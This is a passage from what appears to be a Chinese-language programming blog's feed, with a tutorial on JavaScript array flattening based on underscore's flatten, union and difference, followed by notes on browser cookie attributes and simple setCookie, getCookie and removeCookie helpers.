class="built_in">console</span>.log(flattenDepth(arr))</span><br><span class="line"><span class="comment">// [1, 2, 3,[4,5,[6,7]]] , 8]</span></span><br><span class="line"><span class="built_in">console</span>.log(flattenDepth(arr,<span class="number">2</span>))</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, [6,7], 8]</span></span><br><span class="line"><span class="built_in">console</span>.log(flattenDepth(arr,<span class="number">3</span>))</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>2、reduce</p><p><em>既然是对数组进行处理，最终返回一个值，我们就可以考虑使用 reduce 来简化代码：</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">prev, next</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> prev.concat(<span class="built_in">Array</span>.isArray(next) ? flatten(next) : next)</span><br><span class="line">    &#125;, [])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr));</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>3、ES6 扩展运算符(…)</p><p><em>ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"><span class="built_in">console</span>.log([].concat(...arr));</span><br><span class="line"><span class="comment">//[1, 2, 3, [4, 5, [6, 7]], 8]</span></span><br></pre></td></tr></table></figure><p><em>我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (arr.some(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">Array</span>.isArray(item))) &#123;</span><br><span class="line">        arr = [].concat(...arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr))</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>4、toString</p><p><em>如果数组的元素都是数字，那么我们可以考虑使用 toString 方法，因为：</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line">arr.toString();</span><br><span class="line"><span class="comment">// "1,2,3,4,5,6,7,8"</span></span><br></pre></td></tr></table></figure><p>调用 toString 方法，返回了一个逗号分隔的扁平的字符串，这时候我们再 split，然后转成数字不就可以实现扁平化了吗？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.toString().split(<span class="string">','</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> +item</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr))</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>5、join</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line">arr.join(<span class="string">','</span>).split(<span class="string">','</span>);</span><br><span class="line"><span class="comment">//[1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure><p>6、undercore</p><p><em>那么如何写一个抽象的扁平函数，来方便我们的开发呢，所有又到了我们抄袭 underscore 的时候了~</em></p><p>在这里直接给出源码和注释，但是要注意，这里的 flatten 函数并不是最终的 _.flatten，为了方便多个 API 进行调用，这里对扁平进行了更多的配置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数组扁平化</span></span><br><span class="line"><span class="comment"> * @param  &#123;Array&#125; input   要处理的数组</span></span><br><span class="line"><span class="comment"> * @param  &#123;boolean&#125; shallow 是否只扁平一层</span></span><br><span class="line"><span class="comment"> * @param  &#123;boolean&#125; strict  是否严格处理元素，下面有解释</span></span><br><span class="line"><span class="comment"> * @param  &#123;Array&#125; output  这是为了方便递归而传递的参数</span></span><br><span class="line"><span class="comment"> * 源码地址：https://github.com/jashkenas/underscore/blob/master/underscore.js#L528</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">input, shallow, strict, output</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递归使用的时候会用到output</span></span><br><span class="line">    output = output || [];</span><br><span class="line">    <span class="keyword">var</span> idx = output.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = input.length; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> value = input[i];</span><br><span class="line">        <span class="comment">// 如果是数组，就进行处理</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">            <span class="comment">// 如果是只扁平一层，遍历该数组，依此填入 output</span></span><br><span class="line">            <span class="keyword">if</span> (shallow) &#123;</span><br><span class="line">                <span class="keyword">var</span> j = <span class="number">0</span>, lenn = value.length;</span><br><span class="line">                <span class="keyword">while</span> (j &lt; lenn) output[idx++] = value[j++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果是全部扁平就递归，传入已经处理的 output，递归中接着处理 output</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                flatten(value, shallow, strict, output);</span><br><span class="line">                idx = output.length;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不是数组，根据 strict 的值判断是跳过不处理还是放入 output</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!strict)&#123;</span><br><span class="line">            output[idx++] = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释下 strict，在代码里我们可以看出，当遍历数组元素时，如果元素不是数组，就会对 strict 取反的结果进行判断，如果设置 strict 为 true，就会跳过不进行任何处理，这意味着可以过滤非数组的元素，举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]];</span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr, <span class="literal">true</span>, <span class="literal">true</span>)); <span class="comment">// [3, 4]</span></span><br></pre></td></tr></table></figure><p>那么设置 strict 到底有什么用呢？不急，我们先看下 shallow 和 strct 各种值对应的结果：</p><ul><li>shallow true + strict false ：正常扁平一层</li><li>shallow false + strict false ：正常扁平所有层</li><li>shallow true + strict true ：去掉非数组元素</li><li>shallow false + strict true ： 返回一个[]</li></ul><p>我们看看 underscore 中哪些方法调用了 flatten 这个基本函数：</p><h2 id="flatten"><a href="#flatten" class="headerlink" title="_.flatten"></a>_.flatten</h2><p>首先就是 _.flatten：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_.flatten = <span class="function"><span class="keyword">function</span>(<span class="params">array, shallow</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> flatten(array, shallow, <span class="literal">false</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在正常的扁平中，我们并不需要去掉非数组元素。</p><h2 id="union"><a href="#union" class="headerlink" title="_.union"></a>_.union</h2><p>接下来是 _.union：</p><p>该函数传入多个数组，然后返回传入的数组的并集，</p><p>举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.union([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">101</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">10</span>], [<span class="number">2</span>, <span class="number">1</span>]);</span><br><span class="line">=&gt; [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">101</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure><p>如果传入的参数并不是数组，就会将该参数跳过：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.union([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">101</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">10</span>], <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">=&gt; [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">101</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure><p>为了实现这个效果，我们可以将传入的所有数组扁平化，然后去重，因为只能传入数组，这时候我们直接设置 strict 为 true，就可以跳过传入的非数组的元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关于 unique 可以查看《JavaScript专题之数组去重》[](https://github.com/mqyqingfeng/Blog/issues/27)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unique</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(array));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_.union = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> unique(flatten(<span class="built_in">arguments</span>, <span class="literal">true</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="difference"><a href="#difference" class="headerlink" title="_.difference"></a>_.difference</h2><p>是不是感觉折腾 strict 有点用处了，我们再看一个 _.difference：</p><p>语法为：</p><blockquote><p>_.difference(array, *others)</p></blockquote><p>效果是取出来自 array 数组，并且不存在于多个 other 数组的元素。跟 _.union 一样，都会排除掉不是数组的元素。</p><p>举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.difference([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>], [<span class="number">5</span>, <span class="number">2</span>, <span class="number">10</span>], [<span class="number">4</span>], <span class="number">3</span>);</span><br><span class="line">=&gt; [<span class="number">1</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>实现方法也很简单，扁平 others 的数组，筛选出 array 中不在扁平化数组中的值：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">difference</span>(<span class="params">array, ...rest</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    rest = flatten(rest, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rest.indexOf(item) === <span class="number">-1</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，以上实现的细节并不是完全按照 underscore，具体细节的实现感兴趣可以<a href="https://github.com/jashkenas/underscore/blob/master/underscore.js#L528" target="_blank" rel="noopener">查看源码</a>。</p><p>本文转载自：<br>JavaScript专题系列目录地址：<a href="https://github.com/mqyqingfeng/Blog" target="_blank" rel="noopener">https://github.com/mqyqingfeng/Blog</a>。</p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数组扁平化  将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型)&lt;br&gt;
    
    </summary>
    
      <category term="js" scheme="https://jiuylq.github.io/categories/js/"/>
    
    
      <category term="Array" scheme="https://jiuylq.github.io/tags/Array/"/>
    
  </entry>
  
  <entry>
    <title>cookie 知识小记</title>
    <link href="https://jiuylq.github.io/2019/03/07/cookie/"/>
    <id>https://jiuylq.github.io/2019/03/07/cookie/</id>
    <published>2019-03-06T16:00:00.000Z</published>
    <updated>2019-04-07T05:23:08.075Z</updated>
    
    <content type="html"><![CDATA[<p>cookie 知识小记<br>日常工作中常常会用到cookie，本文总结了一下cookie的常用只是点，用作笔记。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="cookie-知识小记"><a href="#cookie-知识小记" class="headerlink" title="cookie 知识小记"></a>cookie 知识小记</h2><h3 id="什么是-cookie"><a href="#什么是-cookie" class="headerlink" title="什么是 cookie"></a>什么是 <code>cookie</code></h3><p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据。（摘自<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">MDN</a>）</p><h3 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a>主要用途</h3><ul><li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）  </li><li>个性化设置（如用户自定义设置、主题等）  </li><li>浏览器行为跟踪（如跟踪分析用户行为等）</li></ul><h3 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h3><blockquote><p><code>cookie</code>大小： 4KB</p></blockquote><ul><li><p>规范中限定每个域名下不超过 20 个 cookie，早期的浏览器都遵循该规范，并且在 IE7 中有更近一步的提升。在微软的一次更新中，他们在 IE7 中增加 cookie 的限制数量到 50 个，与此同时 Opera 限定 cookie 数量为 30 个，Safari 和 Chrome 对与每个域名下的 cookie 个数没有限制。</p></li><li><p>发向服务器的所有 cookie 的最大数量（空间）仍旧维持原始规范中所指出的：4KB。所有超出该限制的 cookie 都会被截掉并且不会发送至服务器。</p></li></ul><h3 id="cookie的基本操作"><a href="#cookie的基本操作" class="headerlink" title="cookie的基本操作"></a><code>cookie</code>的基本操作</h3><p>简单添加<code>cookie</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"name=value"</span></span><br></pre></td></tr></table></figure></p><h4 id="cookie的属性"><a href="#cookie的属性" class="headerlink" title="cookie的属性"></a>cookie的属性</h4><blockquote><p>cookie中的属性是以分号<code>;</code>分隔，以<code>key=value</code>键值对的方式存在</p></blockquote><ul><li><code>name</code>,<code>value</code><br>  <code>name</code> cookie 的名，一个域名下绑定的cookie，name不能相同，相同的name的值会被覆盖掉<br>  <code>value</code> cookie 的值<br>  <strong>规范中明确指出cookie的名/值中的三个字符必须进行编码：分号、逗号和空格</strong>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"name=value"</span></span><br></pre></td></tr></table></figure></li></ul><p>以下为可选属性：  </p><ul><li><p><code>expires</code><br>  <code>expires</code> cookie 的过期时间， 如果没有定义，cookie会在对话结束时过期，格式参见<code>Date.toUTCString()</code>（<code>expires=date-in-GMTString-format</code>）,现在已经被<code>max-age</code>属性所取代   </p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// days天数</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">d.setTime(d.getTime() + (days * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>));</span><br><span class="line"><span class="comment">// expires=Thu, 01 Jan 1970 00:00:00 GMT</span></span><br><span class="line"><span class="built_in">document</span>.cookie = name + <span class="string">"="</span> + value + <span class="string">"; "</span> + <span class="string">"expires="</span> + d.toUTCString();</span><br></pre></td></tr></table></figure></li><li><p><code>max-age</code><br>  <code>max-age</code> cookie 的有效期，单位秒，格式(<code>max-age=max-age-in-seconds</code>)  </p><ul><li><code>max-age</code>为正数时，cookie会在<code>max-age</code>秒之后，被删除  </li><li>当<code>max-age</code>为负数时，表示的是临时储存，不会生出cookie文件，只会存在浏览器内存中，且只会在打开的浏览器窗口或者子窗口有效，一旦浏览器关闭，cookie就会消失  </li><li>当<code>max-age</code>为0时，又会发生什么呢，删除cookie，因为cookie机制本身没有设置删除cookie，失效的cookie会被浏览器自动从内存中删除，所以，它实现的就是让cookie失效  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">'user=TG;max-age=60*60*24'</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>domain</code><br>  <code>domain</code> 指定Cookie所在的域名，比如example.com，如果指定了一个域，那么子域也包含在内，默认为当前文档位置的路径的域名部分，</p><blockquote><p>所指定的域名必须是当前发送Cookie的域名的一部分，比如当前访问的域名是example.com，就不能将其设为google.com。只有访问的域名匹配domain属性，Cookie才会发送到服务器  </p></blockquote>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"name=value;domain=example.com"</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>path</code><br>  <code>path</code> 属性用来指定路径（比如/、/mydir），如果未指定，默认为当前文档位置的路径。 (<code>path=path</code>)  </p><blockquote><p>IE 浏览器(ie6、ie7 和 ie8) 不支持 max-age，所有的浏览器都支持 expires</p></blockquote><blockquote><p>只有path属性匹配向服务器发送的路径，Cookie才会发送。这里的匹配不是绝对匹配，而是从根路径开始，只要path属性匹配发送路径的一部分，就可以发送。比如，path属性等于/blog，则发送路径是/blog或者/blogroll，Cookie都会发送。path属性生效的前提是domain属性匹配。  </p></blockquote>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"name=value;path=/"</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>secure</code><br>  <code>secure</code> 属性用来指定Cookie只能在加密协议HTTPS下发送到服务器  </p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">'test=hello;secure=true'</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>HttpOnly</code><br>  <code>HttpOnly</code> 属性设为true时，将不能通过js脚本来获取带有 HttpOnly 标记的Cookie，能有效的防止xss攻击。</p></li></ul><h3 id="常用方法的实现（setCookie-getCookie-removeCookie）"><a href="#常用方法的实现（setCookie-getCookie-removeCookie）" class="headerlink" title="常用方法的实现（setCookie,getCookie,removeCookie）"></a>常用方法的实现（setCookie,getCookie,removeCookie）</h3><p>1、<code>setCookie</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @desc  设置Cookie</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; name</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; value</span></span><br><span class="line"><span class="comment"> * @param &#123;Object&#125; opts</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, opts</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// opts: &#123;,</span></span><br><span class="line">    <span class="comment">//     'domain': '',</span></span><br><span class="line">    <span class="comment">//     'path': '',</span></span><br><span class="line">    <span class="comment">//     'expires': '',</span></span><br><span class="line">    <span class="comment">//     'maxAage': '',</span></span><br><span class="line">    <span class="comment">//     'secure': ''</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// 对name和value进行编码</span></span><br><span class="line">    value = <span class="built_in">encodeURIComponent</span>(<span class="built_in">String</span>(value)).replace(<span class="regexp">/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g</span>, <span class="built_in">decodeURIComponent</span>);</span><br><span class="line">name = <span class="built_in">encodeURIComponent</span>(<span class="built_in">String</span>(name)).replace(<span class="regexp">/%(23|24|26|2B|5E|60|7C)/g</span>, <span class="built_in">decodeURIComponent</span>).replace(<span class="regexp">/[\(\)]/g</span>, <span class="built_in">escape</span>);</span><br><span class="line">    <span class="keyword">var</span> options =<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> (opts) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opts.expires &amp;&amp; <span class="keyword">typeof</span> opts.expires === <span class="string">'number'</span>) &#123;</span><br><span class="line">            opts.expires = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="keyword">new</span> <span class="built_in">Date</span>() * <span class="number">1</span> + opts.expires * <span class="number">864e+5</span>).toUTCString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> opts) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!opts[i]) <span class="keyword">continue</span></span><br><span class="line">            options += <span class="string">';'</span> + i</span><br><span class="line">            options += <span class="string">'='</span> + opts[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = name + <span class="string">'='</span> + value + options;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、<code>getCookie</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @desc getCookie</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; name</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/(%[0-9A-Z]&#123;2&#125;)+/g</span>, <span class="built_in">decodeURIComponent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line">    <span class="keyword">var</span> keyVal = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; cookies.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> part = cookies[i].split(<span class="string">'='</span>);</span><br><span class="line">        <span class="keyword">if</span> (decode(part[<span class="number">0</span>]) === name) &#123;</span><br><span class="line">            keyVal[name] = part[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> name ? keyVal[name] : <span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、<code>removeCookie</code>  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @desc getCookie</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; name</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    setCookie(name, <span class="number">1</span>, &#123;<span class="string">'expires'</span>: <span class="number">-1</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>MDN示例</strong>  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 